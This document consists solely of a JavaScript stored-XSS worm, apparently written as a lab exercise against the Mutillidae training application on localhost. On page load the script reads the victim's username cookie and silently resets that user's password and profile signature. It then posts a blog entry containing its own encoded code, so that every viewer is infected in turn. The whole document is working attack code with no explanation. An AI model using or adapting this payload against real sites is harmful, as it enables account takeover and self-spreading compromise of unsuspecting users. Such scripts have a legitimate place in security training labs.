<script type="text/javascript" id="worm">
window.onload=function(){

var Ajax=null;
//Reset Password
var password="p5SZjJLJQqgjz8B";
//Reset Signature
var signature="Owned by John!";
//Blog post display text
var bad_post="This account is now owned by John!";
//Get worm code by ID
var wormCode=encodeURIComponent(document.getElementById("worm").innerHTML); //Encode all content in order to send in ajax

var jsCode="%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%20%69%64%3d%77%6f%72%6d%3e".concat(wormCode).concat("%3c%2f%73%63%72%69%70%74%3e");
//Body of the add_blog_post request
var blog_post="csrf-token=&blog_entry=".concat(bad_post).concat(jsCode).concat("&add-to-your-blog-php-submit-button=Save+Blog+Entry")
//Body of edit_profile POST request

var profile_post="csrf-token=&username=".concat(getCookie("username")).concat("&password=").concat(password).concat("&confirm_password=").concat(password).concat("&my_signature=").concat(signature).concat("&edit-account-profile-php-submit-button=Update+Profile")

//Send profile edit request
var sendurl="http://127.0.0.1/mutillidae/index.php?page=edit-account-profile.php";
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","127.0.0.1");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(profile_post);

//Send worm replication request
var sendurl="http://127.0.0.1/mutillidae/index.php?page=add-to-your-blog.php";
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","127.0.0.1");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(blog_post);
}
function getCookie(name) {
const value = `; ${document.cookie}`;
const parts = value.split(`; ${name}=`);
if (parts.length === 2) return parts.pop().split(`;`).shift();
}
</script>